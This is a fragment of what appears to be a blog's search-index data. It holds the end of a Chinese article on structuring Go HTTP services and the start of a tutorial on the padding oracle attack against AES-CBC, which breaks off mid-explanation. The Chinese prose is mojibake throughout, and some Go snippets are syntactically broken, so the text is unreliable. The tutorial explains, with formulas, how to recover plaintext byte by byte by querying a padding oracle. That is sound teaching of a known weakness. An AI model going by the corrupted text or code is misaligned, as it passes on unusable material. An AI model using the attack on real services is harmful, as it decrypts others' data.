ï¼‰ã€‚\nåœ¨è®¿é—®å…±äº«æ•°æ®æ—¶ï¼Œç¡®ä¿åªæ‰§è¡Œè¯»æ“ä½œï¼Œå¦åˆ™éœ€è¦åŠ é”æˆ–è€…ç±»ä¼¼çš„ä¿æŠ¤æªæ–½ã€‚\né€šè¿‡å‚æ•°ä¼ é€’ handler çš„ç‰¹å®šä¾èµ– å¦‚æœä¸€ä¸ª handler éœ€è¦ä¸€ä¸ªç‰¹æ®Šä¾èµ–ï¼Œå¯ä»¥é€šè¿‡å‚æ•°æ¥ä¼ é€’ã€‚\n1 2 3 4 5 func (s *server) handleGreeting(format string) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, format, \"World\") } } ä½¿ç”¨ HandlerFunc è€Œé Handler æˆ‘å‡ ä¹åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½ä½¿ç”¨ http.HandlerFunc ï¼Œè€Œé http.Handler ã€‚\n1 2 3 4 5 func (s *server) handleSomething() http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { // ... } } ä¸¤è€…åŸºæœ¬ä¸Šæ˜¯å¯äº’æ¢çš„ï¼Œåªéœ€è¦é€‰ä¸€ä¸ªå¯è¯»æ€§æ›´å¼ºçš„å°±å¥½ã€‚å¯¹æˆ‘è€Œè¨€ï¼Œ http.HandlerFunc ä¼šå¥½ç‚¹ã€‚\nä¸­é—´ä»¶å°±æ˜¯æ™®é€šçš„ Go å‡½æ•° ä¸­é—´ä»¶å‡½æ•°æ¥å—ä¸€ä¸ª http.HandlerFunc å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ http.HandlerFunc ï¼Œæ–°çš„è¿™ä¸ª handler å¯ä»¥åœ¨è°ƒç”¨ä¼ å…¥çš„ handler ä¹‹å‰æˆ–ä¹‹åï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å®Œå…¨ä¸æ‰§è¡Œä¼ å…¥çš„ handlerã€‚\n1 2 3 4 5 6 7 8 9 func (s *server) adminOnly(h http.HandlerFunc) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { if !currentUser(r).IsAdmin { http.NotFound(w, r) return } h(w, r) } } ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå¦‚æœ IsAdmin ä¸º falseï¼Œåˆ™è¿”å› 404 å¹¶ä¸”ç»ˆæ­¢å¤„ç†ã€‚æ³¨æ„è¿™ç§æƒ…å†µä¸‹ï¼Œä¼ å…¥çš„ h handler å¹¶æœªè¢«è°ƒç”¨ã€‚\nå¦‚æœ IsAdmin ä¸º trueï¼Œåˆ™æ­£å¸¸èµ°ä¼ å…¥çš„ h handler é€»è¾‘ã€‚\nä¸­é—´ä»¶ä¹Ÿå¯ä»¥åˆ—åœ¨ routes.go ä¸­ï¼š\n1 2 3 4 5 6 7 package app func (s *server) routes() { s.router.HandleFunc(\"/api/\", s.handleAPI)) s.router.HandleFunc(\"/about\", s.handleAbout()) s.router.HandleFunc(\"/\", s.handleIndex()) s.router.HandleFunc(\"/admin\", s.adminOnly(s.handleAdminIndex())) } å°±åœ°å®šä¹‰è¯·æ±‚å’Œå“åº”ç±»å‹ å¦‚æœä¸€ä¸ªç«¯ç‚¹ï¼ˆendpointï¼‰æœ‰è‡ªå·±çš„è¯·æ±‚ã€å“åº”ç±»å‹ï¼Œé€šå¸¸è¿™äº›ç±»å‹åªå¯¹æ”¹ handler æœ‰ç”¨ã€‚\nå¦‚æœç¡®å®å¦‚æ­¤ï¼Œåˆ™å¯ä»¥ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰è¿™äº›ç±»å‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 func (s *server) handleSomething() http.HandlerFunc { type request struct { Name string } type response struct { Greeting string `json:\"greeting\"` } return func(w http.ResponseWriter, r *http.Request) { // ... } } è¿™æ ·ä¸ä¼šæ±¡æŸ“ä½ çš„åŒ…å‘½åç©ºé—´ï¼Œå…è®¸ä½ åœ¨ä¸åŒçš„ handler ä¸­ä½¿ç”¨ç›¸åŒçš„åå­—ï¼Œè€Œéä¸ºæ¯ä¸ª handler æƒ³ä¸€ä¸ªä¸åŒçš„åå­—ã€‚\nåœ¨æµ‹è¯•ä»£ç ä¸­ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹·è´è¿™äº›ç±»å‹å®šä¹‰åˆ°æµ‹è¯•å‡½æ•°ä¸­ã€‚\nç±»å‹å®šä¹‰å¯ä»¥å¸®åŠ©äººä»¬æ„é€ æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥åŠç†è§£ä»£ç  å¦‚æœä½ çš„è¯·æ±‚ã€å“åº”ç±»å‹éšè—åœ¨ handler å†…éƒ¨ï¼Œä½ å¯ä»¥åœ¨æµ‹è¯•ä»£ç ä¸­ç›´æ¥å®šä¹‰æ–°ç±»å‹ã€‚\nè¿™æ˜¯ä¸€ä¸ªè¡¨è¾¾ä½ çš„æ„å›¾ï¼Œæ–¹ä¾¿åäººç†è§£ä½ çš„ä»£ç çš„æœºä¼šã€‚\nä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ª Person ç±»å‹ï¼Œåœ¨å¾ˆå¤šç«¯ç‚¹ï¼ˆendpointï¼‰ä¸­è¢«å¤ç”¨ã€‚å…¶ä¸­æœ‰ä¸€ä¸ª /greet ç«¯ç‚¹ï¼Œæˆ‘ä»¬å¤§æ¦‚ç‡åªå…³å¿ƒ Person.name è¿™ä¸ªå­—æ®µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨æµ‹è¯•ä»£ç ä¸­è¡¨è¾¾è¿™ä¸€ç‚¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func TestGreet(t *testing.T) { is := is.New(t) p := struct { Name string `json:\"name\"` }{ Name: \"Mat Ryer\", } var buf bytes.Buffer err := json.NewEncoder(\u0026buf).Encode(p) is.NoErr(err) // json.NewEncoder req, err := http.NewRequest(http.MethodPost, \"/greet\", \u0026buf) is.NoErr(err) // ... more test code here } ä»…ä»åŠŸèƒ½æµ‹è¯•è§’åº¦æ¥è®²ï¼Œè¿™ä¹ˆåšæ˜¯ OK çš„ï¼Œè¢«æµ‹ä»£ç çš„ç”¨æ³•ä¹Ÿè¡¨è¾¾çš„å¾ˆæ¸…æ¥šã€‚ä½†æ˜¯ä»é²æ£’æ€§æµ‹è¯•çš„è§’åº¦ï¼Œä¹Ÿè®¸éœ€è¦è€ƒè™‘åˆ°ä¼ é€’æ•´ä¸ªæ•°æ®ç»“æ„è¿›å»ï¼Œä¼šä¸ä¼šäº§ç”Ÿä»€ä¹ˆé—®é¢˜ï¼Ÿ\nåˆ©ç”¨ sync.Once è®¾ç½®ä¾èµ– åœ¨å‡†å¤‡ handler çš„æ—¶å€™ï¼Œå¦‚æœéœ€è¦æ‰§è¡Œä¸€äº›æˆæœ¬æ¯”è¾ƒé«˜çš„åˆå§‹åŒ–æ“ä½œï¼Œå¯ä»¥è€ƒè™‘å°†è¯¥æ“ä½œå»¶è¿Ÿåˆ°è¯¥ handler ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™ã€‚\nè¿™å¯ä»¥æ”¹å–„åº”ç”¨çš„å¯åŠ¨æ—¶é—´ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (s *server) handleTemplate(files string...) http.HandlerFunc { var ( init sync.Once tpl *template.Template tplerr error ) return func(w http.ResponseWriter, r *http.Request) { init.Do(func() { tpl, tplerr = template.ParseFiles(files...) }) if tplerr != nil { http.Error(w, tplerr.Error(), http.StatusInternalServerError) return } // use tpl } } sync.Once ç¡®ä¿è¯¥ä»£ç åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œè€Œä¸”å…¶ä»–è°ƒç”¨ï¼ˆå…¶ä»–äººå‘èµ·åŒä¸€ä¸ªè¯·æ±‚æ—¶ï¼‰ä¼šä¸€ç›´é˜»å¡ç›´åˆ°æ‰§è¡Œç»“æŸã€‚\né”™è¯¯æ£€æŸ¥æ”¾åœ¨ init å‡½æ•°å¤–é¢ï¼Œå› æ­¤å¦‚æœæœ‰é”™è¯¯å‘ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥æš´éœ²å‡ºè¯¥é”™è¯¯ï¼ŒåŒæ—¶ä¿ç•™é”™è¯¯æ—¥å¿— å¦‚æœè¯¥ handler æœªè¢«è°ƒç”¨ï¼Œåˆ™è¯¥é«˜æˆæœ¬æ“ä½œæ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚æœ‰äº›æƒ…å†µä¸‹è¿™æ ·åšæœ‰å¾ˆå¤§æ”¶ç›Šï¼Œå–å†³äºä½ çš„ä»£ç æ˜¯å¦‚ä½•éƒ¨ç½²çš„ è¿™ç§æ–¹å¼å®é™…ä¸Šæ˜¯å°†åˆå§‹åŒ–æ—¶é—´ä»å¯åŠ¨é˜¶æ®µè½¬ç§»åˆ°äº†è¿è¡Œæ—¶ã€‚å¦‚æœä½¿ç”¨ Google App Engine åˆ™å¾ˆæœ‰ç”¨ï¼Œå…¶ä»–åœºæ™¯åˆ™éœ€è¦å•ç‹¬è€ƒè™‘ã€‚\næœåŠ¡å¯æµ‹æ€§ ä¸Šè¿°çš„ server ç±»å‹æ˜¯å……åˆ†å¯æµ‹çš„ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 func TestHandleAbout(t *testing.T) { is := is.New(t) srv := server { db: mockDatabase, email: mockEmailSender, } srv.routes() req := httptest.NewRequest(\"GET\", \"/about\", nil) w := httptest.NewRecorder() srv.ServeHTTP(w, req) is.Equal(w.StatusCode, http.StatusOK) } åœ¨æ¯ä¸ªæµ‹è¯•ä¸­åˆ›å»ºä¸€ä¸ª server å®ä¾‹ â€”â€” å¦‚æœè€—æ—¶æ“ä½œæ˜¯æ‡’åŠ è½½çš„ï¼Œé‚£ä¹ˆè¿™ä¹ˆåšä¸ä¼šè€—è´¹å¤ªå¤šæ—¶é—´ï¼Œå³ä½¿å¯¹äºå¤§ç»„ä»¶æ¥è¯´ä¹Ÿé€‚ç”¨ é€šè¿‡è°ƒç”¨ server çš„ ServeHTTP æ–¹æ³•ï¼ŒåŒ…æ‹¬è·¯ç”±ã€ä¸­é—´ä»¶ç­‰æ•´ä¸ªæ ˆéƒ½å¯ä»¥è¢«æµ‹åˆ°ã€‚å½“ç„¶ï¼Œå¦‚æœä½ ä¸å¸Œæœ›æµ‹è¯•æ•´ä¸ªæ ˆï¼Œä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ handler æ–¹æ³• ä½¿ç”¨ httptest.NewRequest å’Œ httptest.NewRecorder æ¥è®°å½• handlers éƒ½åšäº†ä»€ä¹ˆ ä»£ç ä¸­ä½¿ç”¨äº† is æµ‹è¯•æ¡†æ¶ï¼ŒTestify çš„ä¸€ä¸ªè¿·ä½ æ›¿ä»£ç‰ˆæœ¬ï¼šis ","description":"","tags":["golang","server"],"title":"ç»å†å…«å¹´åï¼Œæˆ‘æ˜¯å¦‚ä½•ç”¨ Go å†™ HTTP æœåŠ¡çš„","uri":"/posts/how-i-write-http-services-in-go/"},{"categories":null,"content":"åŸç†é˜è¿° Padding åœ¨å¯†ç å­¦ä¸­ï¼Œç”±äºåº•å±‚åŠ å¯†ç®—æ³•å¾€å¾€æ˜¯é’ˆå¯¹å›ºå®šé•¿åº¦çš„å—æ¥è®¾è®¡çš„ï¼ˆä¾‹å¦‚ AES çš„ CBC æ¨¡å¼çš„å—å¤§å°ä¸º 16ï¼‰ï¼Œæ‰€ä»¥åœ¨å¯¹å¯å˜é•¿åº¦çš„æ˜æ–‡è¿›è¡ŒåŠ å¯†æ—¶ï¼Œä¸€èˆ¬éœ€è¦é¢å¤–å¢åŠ  padding å­—æ®µæ¥æ»¡è¶³å—å¯¹é½ä»¥ä¾¿è¿›è¡ŒåŠ å¯†ã€‚\nPadding æ–¹æ³•å¯èƒ½æœ‰å¤šç§ï¼Œä¸ºç®€å•èµ·è§ï¼Œè¿™é‡Œåªè®¨è®ºå¸¸ç”¨çš„ PKCS7Padding æ–¹æ³•ã€‚åœ¨ PKCS7Padding æ–¹æ³•ä¸­ï¼Œpadding å­—æ®µå¡«å……çš„æ¯ä¸ªå­—èŠ‚çš„å€¼éƒ½æ˜¯ç›¸åŒçš„ï¼Œå…¶å€¼å‡ä¸ºéœ€è¦å¡«å……çš„å­—èŠ‚ä¸ªæ•°ï¼Œä¾‹å¦‚ï¼šå¦‚æœå—å¤§å°æ˜¯ 16ï¼Œ é‚£ä¹ˆæ˜æ–‡ â€œaaaaâ€ çš„ padding å°±æ˜¯ [12]*12ã€‚å¦‚æœæ˜æ–‡é•¿åº¦åˆšå¥½æ˜¯å—å¤§å°çš„æ•´æ•°å€ï¼Œåˆ™éœ€è¦é¢å¤–åŠ ä¸Šä¸€ä¸ªå—çš„ paddingï¼Œå³ [16]*16 ã€‚\nPKCS7Padding çš„ Python å®ç°ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 def pkcs7padding(plaintext): bs = 16 padding_len = bs - len(plaintext) % bs return plaintext + padding_len * chr(padding_len) Padding Oracle æŒ‡è¢«æ”»å‡»å¯¹è±¡æš´éœ²çš„ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å¯ä»¥é€šè¿‡ä»»æ„å½¢å¼æä¾›ï¼Œä¾‹å¦‚å¯èƒ½æ˜¯å‘½ä»¤è¡Œï¼Œå¯èƒ½æ˜¯APIï¼Œä¹Ÿå¯èƒ½æ˜¯ REST æ¥å£ç­‰ç­‰ã€‚å½¢å¼ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯å†…å®¹ï¼Œè¯¥æ¥å£å¯ä»¥è¾“å…¥å¯†æ–‡ï¼Œè¿”å›è¯¥æ®µå¯†æ–‡è§£å¯†åçš„ Padding æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœè§£å¯†ç›¸å…³çš„åº”ç”¨å¼€å‘è€…ä¸å°å¿ƒï¼Œå¾ˆæœ‰å¯èƒ½ä¼šæš´éœ²å‡ºè¯¥ç±»æ¥å£ï¼ˆä¾‹å¦‚åœ¨æä¾› web æœåŠ¡æ—¶ï¼Œåç«¯è§£å¯†ä»£ç æœªå¯¹ Padding å¼‚å¸¸æƒ…å†µè¿›è¡Œæ•æ‰ï¼Œå¯¼è‡´ HTTP 500 é”™è¯¯ï¼‰ã€‚\nPadding Oracle Attack å°±æ˜¯åˆ©ç”¨ Padding Oracle æ¥è¿›è¡Œæ”»å‡»çš„ï¼Œç®€å•æ¥è¯´ï¼Œæ”»å‡»è€…é¦–å…ˆéœ€è¦çªƒå–ä¸€æ®µå¯†æ–‡ï¼Œå…¶æ¬¡è¦æœ‰ä¸€ä¸ª Padding Oracle å¯ä¾›åˆ©ç”¨ï¼Œç„¶åæ”»å‡»è€…ä¾¿å¯é€šè¿‡ä¸æ–­ç¯¡æ”¹å¯†æ–‡å¹¶å‘é€åˆ° Padding Oracle è¿›è¡ŒéªŒè¯çš„æ–¹å¼ï¼Œæ¥å¯¹è¿™æ®µå¯†æ–‡è¿›è¡Œç ´è§£ã€‚\nXORï¼ˆå¼‚æˆ–ï¼‰ åœ¨è§£é‡Šä¸‹ä¸€ä¸ªæ¦‚å¿µä¹‹å‰ï¼Œå…ˆè®©æˆ‘ä»¬ç¨å¾®å¤ä¹ ä¸‹ XORï¼ˆå¼‚æˆ–ï¼‰æ“ä½œã€‚ä¸‹é¢æ˜¯ XOR çš„ä¸€äº›åŸºæœ¬å…¬å¼ï¼š\n1 2 3 4 5 A âŠ• A = 0 A âŠ• 0 = A A âŠ• B = B âŠ• A (A âŠ• B) âŠ• C = A âŠ• (B âŠ• C) âˆ´ A âŠ• B âŠ• B = A âŠ• (B âŠ• B) = A âŠ• 0 = A Cipher-Block Chaining (CBC) æœ¬æ–‡å°†é˜è¿°é’ˆå¯¹ AES CBC æ¨¡å¼çš„ Padding Oracle Attackï¼Œå› æ­¤ï¼Œæœ‰å¿…è¦å…ˆè§£é‡Šä¸‹ CBC æ¨¡å¼çš„å·¥ä½œè¿‡ç¨‹ã€‚\né¡¾åæ€ä¹‰ï¼ŒCBC æ˜¯é’ˆå¯¹å—çš„åŠ å¯†ï¼Œè€Œä¸”å—ä¸å—ä¹‹é—´æ˜¯å­˜åœ¨é“¾å¼å…³ç³»çš„ï¼ˆè¿™ç§é“¾å¼å…³ç³»ä½ å¾ˆå¿«å°±ä¼šç†è§£äº†ï¼‰ã€‚\nåŠ å¯†è¿‡ç¨‹ åœ¨ CBC ä¸­ï¼Œæœ‰ä¸€ä¸ªåå« â€œblock cipher\"çš„ä¸œè¥¿ï¼Œè¿™ä¸ª â€œblock cipherâ€ æ¥å—ã€å—ã€ä½œä¸ºè¾“å…¥ï¼Œå¯†æ–‡ä½œä¸ºè¾“å‡ºã€‚æœ¬æ–‡ä¸æ¶‰åŠ â€œblock cipherâ€ çš„å…·ä½“å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ â€œblock cipherâ€ å½“ä½œé»‘ç›’å­æ¥å¤„ç†ã€‚\nåœ¨ CBC åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ª â€œplaintext blockâ€ åœ¨é€å…¥ â€œblock cipherâ€ å‰ï¼Œéƒ½éœ€è¦å…ˆå’Œå®ƒå‰é¢çš„ â€œciphertext blockâ€ (å³å‰é¢ç›¸é‚»çš„å·²åŠ å¯†çš„å¯†æ–‡å—) è¿›è¡Œ XOR æ“ä½œï¼ŒXOR çš„ç»“æœå†é€å…¥ â€œblock cipher\"è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚è¿™æ„å‘³ç€æ¯ä¸ªåŠ å¯†å‡ºæ¥çš„å¯†æ–‡å—éƒ½ä¾èµ–äºå‰é¢çš„æ˜æ–‡åŠ å¯†åçš„ç»“æœï¼Œå› æ­¤æ”¹å˜æ¯ä¸€ä¸ªæ˜æ–‡å­—ç¬¦éƒ½ä¼šå¯¹åé¢çš„åŠ å¯†ç»“æœäº§ç”Ÿå·¨å¤§å½±å“ã€‚è¿™æ˜¯ä¸€ç§è¢«æ¨èçš„ã€æ¯”è¾ƒå®‰å…¨çš„åŠ å¯†æ¨¡å¼ã€‚\n(from Wikipedia )\nè§£å¯†è¿‡ç¨‹ ç±»ä¼¼çš„ï¼Œåœ¨è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ª â€œblock cipher decryptionâ€ï¼Œè¿™ä¸ªä¸œä¸œæ¥å—ã€å¯†æ–‡å—ã€ä½œä¸ºè¾“å…¥ï¼Œä½†è¾“å‡ºä¸æ˜¯æ˜æ–‡ï¼Œæ˜¯ä¸€ä¸ªä¸­é—´ç»“æœã€‚ç»“åˆä¸Šé¢åŠ å¯†çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸éš¾ç†è§£ï¼Œè¿™ä¸ªä¸­é—´ç»“æœå°±æ˜¯æ˜æ–‡åœ¨å’Œ previous cipher block å¼‚æˆ–ä¹‹åçš„ç»“æœã€‚æ‹¿åˆ°è¿™ä¸ªä¸­é—´ç»“æœåï¼Œè·Ÿè¿›å‰é¢å¼‚æˆ–å…¬å¼çš„æœ€åä¸€æ¡å¯çŸ¥ï¼Œåªéœ€å°†è¯¥ä¸­é—´ç»“æœå’Œ previous cipher block å†åšä¸€æ¬¡å¼‚æˆ–ï¼Œå³å¯å¾—åˆ°æœ€åˆçš„æ˜æ–‡å—ã€‚è‡³æ­¤ï¼Œè¯¥ block è§£å¯†ç»“æŸã€‚å¦‚æœæ˜¯ç¬¬ä¸€ä¸ª cipher blockï¼Œåˆ™å°†ä¸­é—´ç»“æœå’Œ IV è¿›è¡Œä¸€æ¬¡å¼‚æˆ–å³å¯å¾—åˆ°æ˜æ–‡å—ã€‚\n(å›¾ç‰‡æ¥è‡ª Rob Heatonâ€™s blog )\nå½“ç„¶ï¼Œå¦‚æœæ˜¯æœ€åä¸€ä¸ª blockï¼Œè¿˜éœ€è¦æ ¹æ® PKCS7Padding çš„è§„åˆ™å°†å°¾éƒ¨ Padding å‰”é™¤ï¼Œå‰”é™¤ Padding çš„ Python å®ç°ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 def pkcs7unpadding(plaintext): padding_len = ord(plaintext[-1]) # check if the padding_len is valid # ... return plaintext[:-padding_len] æ”»å‡»è¿‡ç¨‹ æœ‰äº†ä¸Šè¿°è¿™äº›æ¦‚å¿µï¼Œæ”»å‡»è¿‡ç¨‹å°±æ¯”è¾ƒå¥½ç†è§£äº†ã€‚\næ”»å‡»è€…å°±æ˜¯é€šè¿‡è®¡ç®—ä¸Šé¢æåˆ°çš„ã€ä¸­é—´ç»“æœã€æ¥è¾¾åˆ°è§£å¯†ç›®çš„çš„ã€‚æ€ä¹ˆè®¡ç®—ã€ä¸­é—´ç»“æœã€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è¯•ï¼åˆ©ç”¨ Padding Oracle æ¥è¯•ã€‚\né¦–å…ˆï¼Œæ˜ç¡®å‡ ä¸ªæ¦‚å¿µï¼š\næˆ‘ä»¬çªƒå–äº†ä¸€æ®µå¯†æ–‡ æˆ‘ä»¬æ˜¯ä¸€å—ä¸€å—æ¥ç ´è§£çš„ï¼ˆå› ä¸º CBC æ˜¯ä¸€å—ä¸€å—åŠ å¯†çš„ï¼‰ æˆ‘ä»¬æœ‰ä¸€ä¸ª Padding Oracle ä¸ºäº†æè¿°æ–¹ä¾¿èµ·è§ï¼Œè¿™é‡Œå®šä¹‰å‡ ä¸ªç¼©å†™ï¼ˆå¯ç»“åˆä¸‹é¢çš„å›¾ç‰‡æ¥ç†è§£ï¼‰ï¼š\nC1: å¾…ç ´è§£å¯†æ–‡å—ç›¸é‚»çš„å‰é¢çš„å¯†æ–‡å— C2: å¾…ç ´è§£å¯†æ–‡å— I2: å¾…ç ´è§£å¯†æ–‡å—ç»è¿‡ â€œblock cipher decryptionâ€ è§£å¯†å‡ºæ¥çš„ä¸­é—´ç»“æœï¼Œå¯ä¸ C1 å¼‚æˆ–åå¾—åˆ°æ˜æ–‡å— P2: å¾…ç ´è§£å¯†æ–‡å—è§£å¯†åçš„æ˜æ–‡å— å› æ­¤æˆ‘ä»¬æœ‰å¦‚ä¸‹å…¬å¼ï¼š\n1 P2 = C1 ^ I2 C1 æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤æˆ‘ä»¬çš„å·¥ä½œå°±æ˜¯ç®—å‡º I2 ã€‚\nç ´è§£æœ€åä¸€ä¸ªå­—èŠ‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä»ç ´è§£æœ€åä¸€ä¸ª block çš„æœ€åä¸€ä¸ªå­—èŠ‚å¼€å§‹ã€‚\næ ¹æ®å‰é¢çš„å®šä¹‰ï¼ŒC2 æ˜¯å¯†æ–‡çš„æœ€åä¸€ä¸ª blockï¼ŒC1 æ˜¯å¯†æ–‡çš„å€’æ•°ç¬¬äºŒä¸ª block ã€‚çœ‹ä¸‹ç ´è§£è¿‡ç¨‹ï¼š\n(å›¾ç‰‡æ¥è‡ª Rob Heatonâ€™s blog )\nå…ˆæŠŠ C1 æ›¿æ¢æˆ [0]*16 ï¼ˆå³16ä¸ª0ï¼‰ï¼ŒæŠŠæ–°çš„ C1 å«åš C1' æŠŠ C1â€™ + C2 ä¼ å…¥ Padding Oracleï¼ŒæˆåŠŸåˆ™è·³åˆ°ç¬¬ 4 æ­¥ï¼Œå¦åˆ™ç»§ç»­ C1â€™[15] è‡ªå¢ï¼ˆä¸Šé™æ˜¯ 255ï¼‰ï¼Œå¹¶é‡å¤ç¬¬ 2 æ­¥ ç”±äº C1â€™ + C2 é€šè¿‡äº† Padding æ£€æŸ¥ï¼Œå¯ä»¥ç¡®å®š P2â€™[15] ä¸€å®šæ˜¯ 1~16 ä¸­çš„ä¸€ä¸ªå€¼ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆå‡å®šæ˜¯1ï¼ˆå¯é€šè¿‡ç»§ç»­ä¿®æ”¹ C1â€™ æ¥è¿›ä¸€æ­¥ç¡®å®š P2â€™[15] çš„å€¼ï¼Œä¸ºäº†é¿å…å¼•å…¥é¢å¤–çš„å¤æ‚åº¦ï¼Œè¿™é‡Œå…ˆä¸ä»‹ç»å¦‚ä½•ç¡®å®š P2â€™[15] çš„å€¼ï¼Œåé¢å†è¯¦ç»†ä»‹ç»ï¼‰ã€‚å‡è®¾æ­¤æ—¶ C1â€™[15] è‡ªå¢åˆ°äº† 94ï¼Œåˆ™æŒ‰ç…§å¦‚ä¸‹å…¬å¼å¯è®¡ç®—å‡º I2[15] 1 2 3 4 I2 = C1' ^ P2' I2[15] = C1'[15] ^ P2'[15] I2[15] = 94 ^ 1 = 95 è¿›ä¸€æ­¥ï¼Œå› ä¸º C1 æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥:\n1 2 P2[15] = C1[15] ^ I2[15] = C1[15] ^ 95 è‡³æ­¤ï¼ŒP2[15] å·²ç»è®¡ç®—å‡ºæ¥äº†ï¼Œå³æœ€åä¸€ä¸ªå­—èŠ‚å·²ç»è¢«ç ´è§£äº†ï¼\nç ´è§£æœ€åä¸€ä¸ª block çš„å‰©ä½™å­—èŠ‚ ä¸ºäº†ç ´è§£å‰©ä½™å­—èŠ‚ï¼Œæˆ‘ä»¬å…ˆå¯ä»¥æŠŠ P2â€™[15] å®šä½ 2ï¼Œæ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œå¦‚æœ padding æ˜¯åˆæ³•çš„ï¼Œåˆ™ P2â€™[14] ä¹Ÿä¸€å®šæ˜¯ 2ã€‚æˆ‘ä»¬å°±æ ¹æ®è¿™ä¸ªæ€è·¯æ¥ç ´è§£å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ã€‚\nå…ˆæŠŠ C1â€™[0..14] ç½® 0ï¼ŒC1â€™[15] è®¾ç½®æˆ 2 ^ I2[15] ï¼ˆç¡®ä¿ P2â€™[15] æ˜¯ 2ï¼‰ C1â€™ + C2 ä¼ å…¥ Padding Oracleï¼Œæµ‹è¯•æˆåŠŸåˆ™è·³åˆ°ç¬¬ 4 æ­¥ï¼Œå¦åˆ™ç»§ç»­ä¸‹ä¸€æ­¥ C1â€™[14] è‡ªå¢ï¼Œé‡å¤ç¬¬ 2 æ­¥ æ ¹æ®ä»¥ä¸‹å…¬å¼è®¡ç®— I2[15]: 1 2 3 I2 = C1' ^ P2' I2[14] = C1'[14] ^ P2'[14] = C1'[14] ^ 2 ç”±äº C1 æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥ï¼š\n1 P2[14] = C1[14] ^ I2[14] è‡³æ­¤ï¼ŒP2[14] è®¡ç®—å‡ºæ¥äº†ï¼Œå³å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚è¢«ç ´è§£äº†ï¼\né‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œå³å¯ç ´è§£æœ€åä¸€ä¸ª block çš„å‰©ä½™å­—èŠ‚ã€‚\né‡å¤ä¸Šé¢ä¸¤èŠ‚çš„æ­¥éª¤ï¼Œå³å¯ç ´è§£æ‰€æœ‰ blockã€‚ç¬¬ä¸€ä¸ª block ç¨æœ‰ä¸åŒï¼Œå› ä¸ºç¬¬ä¸€ä¸ª block æ²¡æœ‰å¯¹åº”çš„ C1ï¼Œæ­¤æ—¶ï¼Œ C1 = IV ã€‚\nç¡®å®šæœ€åä¸€ä¸ªå­—èŠ‚çš„å€¼ æˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹è¿™ä¸ªé—®é¢˜ã€‚\næˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œå¦‚æœæ­¤æ—¶ P2â€™[15] æ˜¯2è€Œä¸æ˜¯1ï¼Œæ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿæ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œè¿™æ„å‘³ç€ï¼š\n1 P2'[14] == P2'[15] == 2 æ³¨æ„æ­¤æ—¶ C1â€™[14] çš„å€¼æ˜¯ 0ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ C1â€™[14] çš„å€¼ï¼ˆä¾‹å¦‚ä¿®æ”¹æˆ1ï¼‰ï¼Œç„¶åå°† C1â€™ + C2 ä¼ å…¥ Padding Oracle è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœé€šè¿‡åˆ™è¡¨ç¤º P2â€™[15] åªå¯èƒ½æ˜¯1ã€‚ä»€ä¹ˆåŸå› å‘¢ï¼Ÿå› ä¸º C1â€™[14] çš„å€¼è¢«ä¿®æ”¹åï¼Œå¿…ç„¶ä¼šå½±å“ P2â€™[14]ï¼Œè€Œå˜åŒ–åçš„ P2â€™ ä»èƒ½é€šè¿‡æµ‹è¯•ï¼Œè¯´æ˜ Padding åªèƒ½æ˜¯ 1ï¼Œå¦åˆ™ P2â€™[14] != P2â€™[15] æ˜¯å¿…ç„¶é€šä¸è¿‡æµ‹è¯•çš„ã€‚å¦‚æœä¿®æ”¹åæ²¡æœ‰é€šè¿‡æµ‹è¯•å‘¢ï¼Ÿæ­¤æ—¶è¯´æ˜ P2â€™[14] \u003e= 2ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦é‡å¤ä»¥ä¸Šæ­¥éª¤ï¼ˆæŠŠ C1â€™[14] é‡ç½®ä¸º0ï¼Œä¿®æ”¹ C1â€™[13] çš„å€¼ä¸º1ï¼‰å†åšä¸€é Padding 